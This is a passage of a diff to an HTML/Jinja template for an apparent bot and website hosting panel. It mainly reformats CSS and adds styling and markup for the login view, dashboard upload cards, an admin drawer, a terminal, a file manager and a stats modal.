+            margin-top: 12px;
+        }
+        .name-edit input {
+            flex: 1;
+            padding: 8px 12px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            color: #fff;
+            outline: none;
+            font-size: 0.85rem;
+        }
+        .name-edit input:focus {
+            border-color: #00e5ff;
+        }
+        .name-edit button {
+            padding: 8px 16px;
+            background: #00e5ff;
+            border: none;
+            border-radius: 12px;
+            color: #000;
+            font-weight: 600;
+            cursor: pointer;
+        }
 
-        .console-wrapper { display: flex; align-items: stretch; gap: 8px; margin-top: 15px; }
-        .console { background: #000; color: #00ff6a; padding: 10px; font-family: monospace; font-size: 10px; border-radius: 8px; height: 100px; overflow-y: auto; border: 1px solid #333; line-height: 1.6; white-space: pre-wrap; flex: 1; }
+        /* Console */
+        .console-wrapper {
+            display: flex;
+            align-items: stretch;
+            gap: 8px;
+            margin-top: 15px;
+        }
+        .console {
+            background: #000;
+            color: #00ff6a;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 10px;
+            border-radius: 8px;
+            height: 100px;
+            overflow-y: auto;
+            border: 1px solid #333;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            flex: 1;
+        }
 
-        .user-footer { text-align: center; margin-top: 30px; }
-        .f-title { font-size: 22px; font-weight: 900; letter-spacing: 5px; }
-        .f-sub { font-size: 11px; opacity: 0.6; margin-bottom: 15px; }
-        .social-box { display: flex; justify-content: center; gap: 20px; }
-        .social-box a { color: #fff; font-size: 20px; width: 40px; height: 40px; border: 1px solid #333; border-radius: 50%; display: flex; align-items: center; justify-content: center; text-decoration: none; transition: border-color 0.2s; }
-        .social-box a:hover { border-color: #00e5ff; }
+        /* Footer */
+        .user-footer {
+            text-align: center;
+            margin-top: 30px;
+        }
+        .f-title {
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: 5px;
+        }
+        .f-sub {
+            font-size: 11px;
+            opacity: 0.6;
+            margin-bottom: 15px;
+        }
+        .social-box {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        .social-box a {
+            color: #fff;
+            font-size: 20px;
+            width: 40px;
+            height: 40px;
+            border: 1px solid #333;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            transition: border-color 0.2s;
+        }
+        .social-box a:hover {
+            border-color: #00e5ff;
+        }
 
-        /* Admin Drawer */
-        .admin-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 999; justify-content: flex-end; animation: fadeIn 0.25s ease; }
-        .admin-overlay.open { display: flex; }
-        .admin-drawer { width: 100%; max-width: 480px; height: 100%; background: #0c1018; padding: 24px 20px; overflow-y: auto; box-shadow: -10px 0 30px rgba(0,0,0,0.8); animation: slideIn 0.3s ease; display: flex; flex-direction: column; }
-        .admin-drawer-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 1px solid #222; }
-        .admin-drawer-header h2 { color: #00e5ff; font-size: 1.2rem; letter-spacing: 2px; }
-        .admin-close-btn { background: none; border: none; color: #ff4d4d; font-size: 28px; cursor: pointer; padding: 0 6px; }
-        .admin-tabs { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
-        .admin-tabs button { flex: 1; padding: 12px; border: 1px solid #333; border-radius: 10px; background: transparent; color: #aaa; font-weight: bold; font-size: 13px; cursor: pointer; transition: all 0.2s; min-width: 80px; }
-        .admin-tabs button.active { background: #00e5ff22; border-color: #00e5ff; color: #00e5ff; }
-        .admin-tabs button:hover { border-color: #555; }
-        .admin-panel-content { flex: 1; }
-        .admin-tab-content { display: none; }
-        .admin-tab-content.active { display: block; }
+        /* ---------- ADMIN OVERLAY (DRAWER) ---------- */
+        .admin-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 999;
+            justify-content: flex-end;
+            animation: fadeIn 0.25s ease;
+        }
+        .admin-overlay.open {
+            display: flex;
+        }
 
-        /* User Cards */
-        .list-item { background: #111; border: 1px solid #2a2a2a; border-radius: 12px; padding: 14px 16px; margin-bottom: 14px; display: flex; flex-direction: column; gap: 10px; }
-        .list-item .row { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; }
-        .list-item .row .info { flex: 1; min-width: 120px; }
-        .list-item .info .uname { font-weight: 700; font-size: 15px; color: #fff; }
-        .list-item .info .upass { font-size: 13px; color: #888; font-family: monospace; }
-        .badge-role { font-size: 10px; padding: 2px 10px; border-radius: 20px; font-weight: bold; text-transform: uppercase; white-space: nowrap; }
-        .badge-role.admin { background: #00e5ff33; color: #00e5ff; border: 1px solid #00e5ff55; }
-        .badge-role.user { background: #444; color: #ccc; border: 1px solid #555; }
-        .badge-role.banned { background: #ff333333; color: #ff4d4d; border: 1px solid #ff4d4d55; }
-        .limit-group { display: flex; align-items: center; gap: 6px; }
-        .limit-group label { color: #aaa; font-size: 13px; font-weight: bold; }
-        .list-item .limit-input { width: 70px; background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 8px 6px; border-radius: 5px; font-size: 13px; outline: none; text-align: center; }
-        .btn-action { border: none; cursor: pointer; font-weight: bold; border-radius: 5px; padding: 8px 14px; font-size: 12px; white-space: nowrap; }
-        .btn-set { background: #00e5ff33; color: #00e5ff; border: 1px solid #00e5ff55; }
-        .btn-ban { background: #ff333333; color: #ff4d4d; border: 1px solid #ff4d4d55; }
-        .btn-reset { background: #333; color: #fff; border: 1px solid #555; }
-        .btn-del { background: #ff333333; color: #ff4d4d; border: 1px solid #ff4d4d55; width: 100%; padding: 10px; text-align: center; }
-        .btn-create { background: #00e5ff; color: #000; border: none; padding: 10px 18px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 13px; }
-        .btn-create:hover { opacity: 0.9; }
-        .section-title { color: #00e5ff; font-size: 14px; font-weight: bold; margin: 18px 0 10px 0; border-bottom: 1px solid #222; padding-bottom: 6px; }
-        .empty-msg { text-align: center; color: #555; padding: 20px 0; font-size: 14px; }
+        .admin-drawer {
+            width: 100%;
+            max-width: 480px;
+            height: 100%;
+            background: #0c1018;
+            padding: 24px 20px;
+            overflow-y: auto;
+            box-shadow: -10px 0 30px rgba(0, 0, 0, 0.8);
+            animation: slideIn 0.3s ease;
+            display: flex;
+            flex-direction: column;
+        }
 
-        /* Terminal */
-        .terminal-box { background: #010409; color: #50fa7b; height: 350px; overflow-y: scroll; padding: 12px; border: 1px solid #30363d; font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; border-radius: 6px; margin-bottom: 10px; line-height: 1.6; }
-        .terminal-controls { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
-        .terminal-controls input { flex: 1; background: #0d1117; border: 1px solid #30363d; color: white; padding: 14px; border-radius: 6px; font-size: 16px; outline: none; min-width: 150px; }
-        .terminal-controls input:focus { border-color: #00e5ff; }
-        .terminal-controls button { padding: 12px 20px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 14px; }
-        .btn-term-run { background: #238636; color: white; }
-        .btn-term-stop { background: #da3633; color: white; }
-        .btn-term-clear { background: #555; color: white; }
+        .admin-drawer-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #222;
+        }
+        .admin-drawer-header h2 {
+            color: #00e5ff;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+        }
+        .admin-close-btn {
+            background: none;
+            border: none;
+            color: #ff4d4d;
+            font-size: 28px;
+            cursor: pointer;
+            padding: 0 6px;
+        }
 
-        /* Modal */
-        .custom-modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 10001; justify-content: center; align-items: center; animation: fadeIn 0.2s ease; }
-        .custom-modal-overlay.open { display: flex; }
-        .custom-modal { background: #0c1018; border: 1px solid #2a2a2a; border-radius: 20px; padding: 30px 28px; max-width: 500px; width: 90%; max-height: 90vh; overflow-y: auto; box-shadow: 0 10px 40px rgba(0,0,0,0.8); text-align: left; }
-        .custom-modal .modal-icon { font-size: 40px; margin-bottom: 12px; text-align: center; color: #00e5ff; }
-        .custom-modal .modal-body { color: #eee; font-size: 15px; line-height: 1.6; margin-bottom: 24px; }
-        .custom-modal .modal-body textarea { width: 100%; background: #050807; color: #00ff88; border: 1px solid #333; border-radius: 6px; padding: 10px; font-family: 'Courier New', monospace; font-size: 0.7rem; resize: vertical; tab-size: 4; min-height: 200px; }
-        .custom-modal .modal-actions { display: flex; gap: 12px; justify-content: flex-end; flex-wrap: wrap; }
-        .custom-modal .modal-actions button { padding: 12px 28px; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; min-width: 100px; transition: background 0.2s; }
-        .custom-modal .modal-actions .btn-confirm { background: #00e5ff; color: #000; }
-        .custom-modal .modal-actions .btn-cancel { background: #333; color: #fff; border: 1px solid #555; }
-        .custom-modal .modal-actions .btn-ok { background: #00e5ff; color: #000; width: 100%; }
-        .custom-modal .modal-body .btn-sm { padding: 6px 14px; font-size: 0.55rem; border: 1px solid #33ddff; color: #33ddff; background: transparent; border-radius: 6px; cursor: pointer; }
+        .admin-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .admin-tabs button {
+            flex: 1;
+            padding: 12px;
+            border: 1px solid #333;
+            border-radius: 10px;
+            background: transparent;
+            color: #aaa;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            min-width: 80px;
+        }
+        .admin-tabs button.active {
+            background: #00e5ff22;
+            border-color: #00e5ff;
+            color: #00e5ff;
+        }
+        .admin-tabs button:hover {
+            border-color: #555;
+        }
 
-        /* Settings Modal */
-        .settings-form label { display: block; color: #aaa; font-size: 13px; margin-top: 15px; margin-bottom: 4px; }
-        .settings-form input[type="text"], .settings-form input[type="file"] { width: 100%; background: #161b25; border: 1px solid #2b3240; color: white; padding: 12px; border-radius: 8px; outline: none; font-size: 14px; }
-        .settings-form input:focus { border-color: #00e5ff; }
-        .settings-form .logo-preview { margin-top: 10px; max-width: 100px; max-height: 100px; border-radius: 50%; border: 2px solid #00e5ff; }
-        .settings-form .btn-remove-logo { background: #ff3333; color: #fff; border: none; padding: 8px 16px; border-radius: 5px; cursor: pointer; margin-top: 8px; }
+        .admin-panel-content {
+            flex: 1;
+        }
+        .admin-tab-content {
+            display: none;
+        }
+        .admin-tab-content.active {
+            display: block;
+        }
 
-        /* Stats */
-        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px; }
-        .stat-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 15px; padding: 15px; text-align: center; }
-        .stat-card .label { color: #888; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; }
-        .stat-card .value { font-size: 1.6rem; font-weight: bold; color: #00e5ff; margin: 5px 0; }
-        .stat-card .sub { color: #666; font-size: 0.8rem; }
-        .stat-card .progress-bar { width: 100%; height: 6px; background: #1a1a1a; border-radius: 4px; margin-top: 8px; overflow: hidden; }
-        .stat-card .progress-bar .fill { height: 100%; background: linear-gradient(90deg,#7a00ff,#00e5ff); border-radius: 4px; transition: width 0.5s; }
-        .offset-section { border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px; margin-top: 15px; }
-        .offset-section label { color: #aaa; }
-        .offset-section .offset-input { display: flex; gap: 10px; margin-top: 5px; }
-        .offset-section .offset-input input { flex: 1; background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 10px; color: #fff; }
-        .offset-section .offset-input button { background: #00e5ff; border: none; border-radius: 8px; padding: 10px 20px; color: #000; font-weight: 700; cursor: pointer; }
+        /* ---------- ADMIN USER CARDS ---------- */
+        .list-item {
+            background: #111;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 14px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .list-item .row {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 8px;
+        }
+        .list-item .row .info {
+            flex: 1;
+            min-width: 120px;
+        }
+        .list-item .info .uname {
+            font-weight: 700;
+            font-size: 15px;
+            color: #fff;
+        }
+        .list-item .info .upass {
+            font-size: 13px;
+            color: #888;
+            font-family: monospace;
+        }
+        .badge-role {
+            font-size: 10px;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-weight: bold;
+            text-transform: uppercase;
+            white-space: nowrap;
+        }
+        .badge-role.admin {
+            background: #00e5ff33;
+            color: #00e5ff;
+            border: 1px solid #00e5ff55;
+        }
+        .badge-role.user {
+            background: #444;
+            color: #ccc;
+            border: 1px solid #555;
+        }
+        .badge-role.banned {
+            background: #ff333333;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+        }
 
-        @keyframes fadeIn { 0% { opacity: 0; } 100% { opacity: 1; } }
-        @keyframes slideIn { 0% { transform: translateX(60px); opacity: 0; } 100% { transform: translateX(0); opacity: 1; } }
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-track { background: #0c1018; }
-        ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
-        @media (max-width: 480px) { .admin-drawer { max-width: 100%; padding: 18px 14px; } .list-item .row { flex-direction: column; align-items: stretch; } .admin-tabs button { font-size: 11px; padding: 8px; } .bot-controls { grid-template-columns: 1fr 1fr; } .website-actions { grid-template-columns: 1fr 1fr 1fr; } .stats-grid { grid-template-columns: 1fr; } }
+        .limit-group {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .limit-group label {
+            color: #aaa;
+            font-size: 13px;
+            font-weight: bold;
+        }
+        .list-item .limit-input {
+            width: 70px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 8px 6px;
+            border-radius: 5px;
+            font-size: 13px;
+            outline: none;
+            text-align: center;
+        }
+        .list-item .limit-input:focus {
+            border-color: #00e5ff;
+        }
+
+        .btn-action {
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 5px;
+            padding: 8px 14px;
+            font-size: 12px;
+            white-space: nowrap;
+        }
+        .btn-set {
+            background: #00e5ff33;
+            color: #00e5ff;
+            border: 1px solid #00e5ff55;
+        }
+        .btn-set:hover {
+            background: #00e5ff55;
+        }
+        .btn-ban {
+            background: #ff333333;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+        }
+        .btn-ban:hover {
+            background: #ff4d4d33;
+        }
+        .btn-reset {
+            background: #333;
+            color: #fff;
+            border: 1px solid #555;
+        }
+        .btn-reset:hover {
+            background: #444;
+        }
+        .btn-del {
+            background: #ff333333;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+            width: 100%;
+            padding: 10px;
+            text-align: center;
+        }
+        .btn-del:hover {
+            background: #ff4d4d33;
+        }
+        .btn-create {
+            background: #00e5ff;
+            color: #000;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 13px;
+        }
+        .btn-create:hover {
+            opacity: 0.9;
+        }
+        .btn-remove {
+            background: transparent;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+            padding: 6px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        .btn-remove:hover {
+            background: #ff4d4d22;
+        }
+
+        /* Create user form */
+        #createUserForm {
+            display: none;
+            background: #1a1a1a;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #2a2a2a;
+        }
+        #createUserForm input,
+        #createUserForm select {
+            background: #0c1018;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 12px;
+            border-radius: 8px;
+            width: 100%;
+            margin-bottom: 10px;
+            outline: none;
+            font-size: 14px;
+        }
+        #createUserForm input:focus,
+        #createUserForm select:focus {
+            border-color: #00e5ff;
+        }
+
+        /* Simple list for User Menu tab */
+        .simple-list-item {
+            background: #111;
+            border: 1px solid #2a2a2a;
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .simple-list-item .info {
+            display: flex;
+            flex-direction: column;
+        }
+        .simple-list-item .info .uname {
+            font-weight: 700;
+            font-size: 14px;
+            color: #fff;
+        }
+        .simple-list-item .info .upass {
+            font-size: 12px;
+            color: #888;
+            font-family: monospace;
+        }
+        .simple-list-item .actions button {
+            background: transparent;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        .simple-list-item .actions button:hover {
+            background: #ff4d4d22;
+        }
+
+        .section-title {
+            color: #00e5ff;
+            font-size: 14px;
+            font-weight: bold;
+            margin: 18px 0 10px 0;
+            border-bottom: 1px solid #222;
+            padding-bottom: 6px;
+        }
+
+        .empty-msg {
+            text-align: center;
+            color: #555;
+            padding: 20px 0;
+            font-size: 14px;
+        }
+
+        /* ---------- TERMINAL ---------- */
+        .terminal-box {
+            background: #010409;
+            color: #50fa7b;
+            height: 350px;
+            overflow-y: scroll;
+            padding: 12px;
+            border: 1px solid #30363d;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            white-space: pre-wrap;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+        .terminal-box .prompt {
+            color: #58a6ff;
+        }
+        .terminal-box .output {
+            color: #50fa7b;
+        }
+        .terminal-box .error {
+            color: #ff6b6b;
+        }
+        .terminal-controls {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .terminal-controls input {
+            flex: 1;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: white;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 16px;
+            outline: none;
+            min-width: 150px;
+        }
+        .terminal-controls input:focus {
+            border-color: #00e5ff;
+        }
+        .terminal-controls button {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-term-run {
+            background: #238636;
+            color: white;
+        }
+        .btn-term-run:hover {
+            background: #2ea043;
+        }
+        .btn-term-stop {
+            background: #da3633;
+            color: white;
+        }
+        .btn-term-stop:hover {
+            background: #f85149;
+        }
+        .btn-term-clear {
+            background: #555;
+            color: white;
+        }
+        .btn-term-clear:hover {
+            background: #666;
+        }
+
+        /* ---------- CUSTOM MODAL ---------- */
+        .custom-modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 10001;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.2s ease;
+        }
+        .custom-modal-overlay.open {
+            display: flex;
+        }
+
+        .custom-modal {
+            background: #0c1018;
+            border: 1px solid #2a2a2a;
+            border-radius: 20px;
+            padding: 30px 28px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
+            text-align: left;
+        }
+        .custom-modal .modal-icon {
+            font-size: 40px;
+            margin-bottom: 12px;
+            text-align: center;
+            color: #00e5ff;
+        }
+        .custom-modal .modal-body {
+            color: #eee;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+        .custom-modal .modal-body textarea {
+            width: 100%;
+            background: #050807;
+            color: #00ff88;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            resize: vertical;
+            tab-size: 4;
+            min-height: 200px;
+        }
+        .custom-modal .modal-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: flex-end;
+            flex-wrap: wrap;
+        }
+        .custom-modal .modal-actions button {
+            padding: 12px 28px;
+            border: none;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            min-width: 100px;
+            transition: background 0.2s;
+        }
+        .custom-modal .modal-actions .btn-confirm {
+            background: #00e5ff;
+            color: #000;
+        }
+        .custom-modal .modal-actions .btn-confirm:hover {
+            background: #00d4f0;
+        }
+        .custom-modal .modal-actions .btn-cancel {
+            background: #333;
+            color: #fff;
+            border: 1px solid #555;
+        }
+        .custom-modal .modal-actions .btn-cancel:hover {
+            background: #444;
+        }
+        .custom-modal .modal-actions .btn-ok {
+            background: #00e5ff;
+            color: #000;
+            width: 100%;
+        }
+        .custom-modal .modal-actions .btn-ok:hover {
+            background: #00d4f0;
+        }
+        .custom-modal .modal-body .btn-sm {
+            padding: 6px 14px;
+            font-size: 0.55rem;
+            border: 1px solid #33ddff;
+            color: #33ddff;
+            background: transparent;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        /* ---------- SETTINGS MODAL ---------- */
+        #settingsModalOverlay {
+            z-index: 9999;
+        }
+
+        .settings-form label {
+            display: block;
+            color: #aaa;
+            font-size: 13px;
+            margin-top: 15px;
+            margin-bottom: 4px;
+        }
+        .settings-form input[type="text"],
+        .settings-form input[type="file"] {
+            width: 100%;
+            background: #161b25;
+            border: 1px solid #2b3240;
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            outline: none;
+            font-size: 14px;
+        }
+        .settings-form input:focus {
+            border-color: #00e5ff;
+        }
+        .settings-form .logo-preview {
+            margin-top: 10px;
+            max-width: 100px;
+            max-height: 100px;
+            border-radius: 50%;
+            border: 2px solid #00e5ff;
+        }
+        .settings-form .btn-remove-logo {
+            background: #ff3333;
+            color: #fff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .settings-form .btn-remove-logo:hover {
+            background: #cc0000;
+        }
+
+        /* ---------- FILE MANAGER ---------- */
+        .file-manager {
+            max-height: 400px;
+            overflow-y: auto;
+            background: #0d1117;
+            border-radius: 8px;
+            padding: 10px;
+        }
+        .file-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 12px;
+            border-bottom: 1px solid #1e1e1e;
+            cursor: pointer;
+            transition: background 0.2s;
+            user-select: none;
+        }
+        .file-item:hover {
+            background: #1a1f2b;
+        }
+        .file-item.selected {
+            background: #2a3a5a;
+            border-left: 3px solid #00e5ff;
+        }
+        .file-item .name {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #ccc;
+        }
+        .file-item .name i {
+            width: 20px;
+            color: #00e5ff;
+        }
+        .file-item .name .dir-icon {
+            color: #f0c674;
+        }
+        .file-item .size {
+            font-size: 12px;
+            color: #888;
+        }
+        .file-breadcrumb {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            margin-bottom: 10px;
+            padding: 8px;
+            background: #1a1f2b;
+            border-radius: 6px;
+        }
+        .file-breadcrumb span {
+            color: #00e5ff;
+            cursor: pointer;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+        .file-breadcrumb span:hover {
+            background: #2a3a5a;
+        }
+        .file-breadcrumb .sep {
+            color: #555;
+            cursor: default;
+        }
+        .file-context-menu {
+            display: none;
+            position: fixed;
+            background: #1a1f2b;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 6px 0;
+            z-index: 10002;
+            min-width: 150px;
+        }
+        .file-context-menu .menu-item {
+            padding: 8px 16px;
+            color: #ccc;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .file-context-menu .menu-item:hover {
+            background: #2a3a5a;
+        }
+        .file-context-menu .menu-item.danger {
+            color: #ff4d4d;
+        }
+
+        /* Stats Modal */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        .stat-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+        }
+        .stat-card .label {
+            color: #888;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .stat-card .value {
+            font-size: 1.6rem;
+            font-weight: bold;
+            color: #00e5ff;
+            margin: 5px 0;
+        }
+        .stat-card .sub {
+            color: #666;
+            font-size: 0.8rem;
+        }
+        .stat-card .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #1a1a1a;
+            border-radius: 4px;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+        .stat-card .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg,#7a00ff,#00e5ff);
+            border-radius: 4px;
+            transition: width 0.5s;
+        }
+        .offset-section {
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 15px;
+            margin-top: 15px;
+        }
+        .offset-section label {
+            color: #aaa;
+        }
+        .offset-section .offset-input {
+            display: flex;
+            gap: 10px;
+            margin-top: 5px;
+        }
+        .offset-section .offset-input input {
+            flex: 1;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 10px;
+            color: #fff;
+        }
+        .offset-section .offset-input button {
+            background: #00e5ff;
+            border: none;
+            border-radius: 8px;
+            padding: 10px 20px;
+            color: #000;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        /* ---------- ANIMATIONS ---------- */
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        @keyframes slideIn {
+            0% { transform: translateX(60px); opacity: 0; }
+            100% { transform: translateX(0); opacity: 1; }
+        }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0c1018;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 4px;
+        }
+
+        @media (max-width: 480px) {
+            .admin-drawer { max-width: 100%; padding: 18px 14px; }
+            .list-item .row { flex-direction: column; align-items: stretch; }
+            .list-item .limit-input { width: 100%; }
+            .create-row { flex-direction: column; }
+            .limit-group { flex-wrap: wrap; }
+            .admin-tabs button { font-size: 11px; padding: 8px; }
+            .terminal-controls { flex-wrap: wrap; }
+            .terminal-controls input { width: 100%; }
+            .bot-controls { grid-template-columns: 1fr 1fr; }
+            .website-actions { grid-template-columns: 1fr 1fr 1fr; }
+            .file-item { flex-wrap: wrap; }
+            .stats-grid { grid-template-columns: 1fr; }
+        }
     </style>
 </head>
 <body>
 
-    <!-- ===== LOGIN ===== -->
-    <div id="loginView" class="view active">
+    <!-- ============================================================ -->
+    <!--  VIEW: LOGIN                                                   -->
+    <!-- ============================================================ -->
+    <div id="loginView" class="view {% if not logged_in %}active{% endif %}">
         <div class="login-card">
             <div class="login-content">
-                <div class="login-icon" id="loginIcon"><i class="fa-solid fa-user"></i></div>
+                <div class="login-icon" id="loginIcon">
+                    {% if logo_url %}
+                        <img src="{{ logo_url }}" alt="Logo" />
+                    {% else %}
+                        <i class="fa-solid fa-user"></i>
+                    {% endif %}
+                </div>
                 <h1 class="login-title">{{ website_name }}</h1>
-                <select id="loginRoleSelect"><option value="user">USER ACCESS</option><option value="admin">Admin</option></select>
+                <select id="loginRoleSelect">
+                    <option value="user" selected>USER ACCESS</option>
+                    <option value="admin">Admin</option>
+                </select>
                 <input type="text" id="loginUsername" placeholder="Enter Username" />
                 <input type="password" id="loginPassword" placeholder="Password" />
                 <button class="login-btn" id="loginBtn">ACCESS SYSTEM</button>
@@ -2312,103 +3627,152 @@ HTML_TEMPLATE = """
         </div>
     </div>
 
-    <!-- ===== DASHBOARD ===== -->
-    <div id="userView" class="view">
+    <!-- ============================================================ -->
+    <!--  VIEW: USER DASHBOARD                                          -->
+    <!-- ============================================================ -->
+    <div id="userView" class="view {% if logged_in %}active{% endif %}">
         <div class="user-container">
+
+            <!-- Header -->
             <div class="user-header">
                 <div class="user-header-left">
                     <span class="hamburger" id="hamburgerBtn">☰</span>
-                    <span class="user-title" id="websiteTitle">{{ website_name }}</span>
+                    <span class="user-title">{{ website_name }}</span>
                 </div>
                 <div class="power-btn" id="logoutBtn"><i class="fa-solid fa-power-off"></i></div>
             </div>
 
+            <!-- Tabs - Bots First -->
             <div class="tabs">
                 <button class="tab-btn active" data-tab="bots">🤖 Bots</button>
                 <button class="tab-btn" data-tab="websites">🌐 Websites</button>
             </div>
 
+            <!-- Bots Tab -->
             <div id="tab-bots" class="tab-content active">
                 <div class="upload-card" id="uploadCardBot">
                     <div class="cloud-icon"><i class="fa-solid fa-robot"></i></div>
-                    <div>UPLOAD BOT (ZIP or files)</div>
+                    <div id="uploadLabelBot">UPLOAD BOT (ZIP or files)</div>
                     <div class="deploy-btn" id="deployBtnBot">DEPLOY BOT</div>
                     <input type="file" id="fileInputBot" style="display:none;" multiple accept=".zip,.py,.js,.go,.rb,.php,.sh,.pl,.json,.txt" />
                     <div id="fileCountDisplayBot"></div>
                 </div>
                 <div id="botListContainer"></div>
-                <div class="console-wrapper"><div class="console" id="botConsole">Select a bot to see logs.</div></div>
+                <div class="console-wrapper">
+                    <div class="console" id="botConsole">Select a bot to see logs.</div>
+                </div>
             </div>
 
+            <!-- Websites Tab -->
             <div id="tab-websites" class="tab-content">
                 <div class="upload-card" id="uploadCardWebsite">
                     <div class="cloud-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
-                    <div>UPLOAD WEBSITE (ZIP or files)</div>
+                    <div id="uploadLabelWebsite">UPLOAD WEBSITE (ZIP or files)</div>
                     <div class="deploy-btn" id="deployBtnWebsite">DEPLOY WEBSITE</div>
                     <input type="file" id="fileInputWebsite" style="display:none;" multiple accept=".zip,.py,.js,.html,.css,.json,.txt,.php,.go,.rb,.sh,.pl,.jar,.war,.xml,.gradle" />
